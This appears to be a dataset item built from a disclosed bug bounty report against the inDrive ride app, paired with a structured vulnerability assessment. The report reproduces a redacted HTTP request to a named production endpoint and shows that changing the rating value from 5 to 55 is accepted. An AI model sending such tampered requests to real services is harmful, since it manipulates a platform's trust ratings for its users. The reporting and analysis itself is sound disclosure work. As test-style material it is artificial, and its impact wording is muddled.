# BUSINESS_LOGIC — h1

- source: h1
- class: business_logic
- cwe: CWE-840
- severity: medium
- program: indrive
- quality_score: 12

## Scenario

Analyze the following vulnerability report and provide a structured security assessment.

**Report Title:** Unlimited fake rate to the passenger in city to city, Affected endpoint `/api/v1/reviews/ride/<ID>/driver`
**Affected Asset:** intercity-*.eu-east-1.indriverapp.com

**Vulnerability Description:**
## Summary:

Hey Kirill, Hope you are doing well today Inshallah <3

I found a bug today allowing to increase the profile rate for the passenger !!

Let’s Start reproducing directly ..

## Steps to reproduce:

1. First of all, We gonna create a normal city to city shared ride, Then join it with any normal passenger’s account and complete it ..
2. At the end of the ride, After the passenger marks it as completed, The driver can rate the passenger !!
3. The request is like this:
    
    ```
    POST /api/v1/reviews/ride/███/driver HTTP/2
    Host: intercity-3.eu-east-1.indriverapp.com
    X-City-Id: 9415
    Accept-Language: en_US
    X-Os-Type: android
    X-App-Flavor: indriver
    X-App: android 5.41.1
    ██████
    Authorization: Bearer █████
    Traceparent: ██████
    Content-Type: application/json; charset=utf-8
    Content-Length: 32
    Accept-Encoding: gzip, deflate
    User-Agent: okhttp/4.10.0
    
    {"message":"Prince","rating":5}
    ```
    
4. Just change the `"rating":5` to any higher number, like: `"rating":55`
5. 200 OK !!
6. and The final profile for the passenger is:
    
    ████████
    
7. Thank You <3

## Impact

- Getting higher the driver’s profile rate in city to city, **Which is in an application like indriver This should not NEVERRRRR be happened !!**

**Steps to Reproduce:**
1. First of all, We gonna create a normal city to city shared ride, Then join it with any normal passenger’s account and complete it ..
2. At the end of the ride, After the passenger marks it as completed, The driver can rate the passenger !!
3. The request is like this:
    
    ```
    POST /api/v1/reviews/ride/███/driver HTTP/2
    Host: intercity-3.eu-east-1.indriverapp.com
    X-City-Id: 9415
    Accept-Language: en_US
    X-Os-Type: android
    X-App-Flavor: indriver
    X-App: android 5.41.1
    ██████
    Authorization: Bearer █████
    Traceparent: ██████
    Content-Type: application/json; charset=utf-8
    Content-Length: 32
    Accept-Encoding: gzip, deflate
    User-Agent: okhttp/4.10.0
    
    {"message":"Prince","rating":5}
    ```
    
4. Just change the `"rating":5` to any higher number, like: `"rating":55`
5. 200 OK !!
6. and The final profile for the passenger is:
    
    ████████
    
7. Thank You <3

**Proof of Concept:**
```
    POST /api/v1/reviews/ride/███/driver HTTP/2
    Host: intercity-3.eu-east-1.indriverapp.com
    X-City-Id: 9415
    Accept-Language: en_US
    X-Os-Type: android
    X-App-Flavor: indriver
    X-App: android 5.41.1
    ██████
    Authorization: Bearer █████
    Traceparent: ██████
    Content-Type: application/json; charset=utf-8
    Content-Length: 32
    Accept-Encoding: gzip, deflate
    User-

## Analysis / Response

**Vulnerability Class:** business_logic
**CWE:** CWE-840
**Weakness:** Business Logic Errors
**Severity:** medium
**Endpoint Pattern:** POST /api/v1/reviews/ride/███/driver

**Impact Assessment:**
- Getting higher the driver’s profile rate in city to city, **Which is in an application like indriver This should not NEVERRRRR be happened !!**

Subscribe to our telegram channel with updates https://t.me/indrive_bbp

**Remediation:**
Implement server-side validation for all business rules. Add rate limiting and anomaly detection. Test edge cases during security reviews.
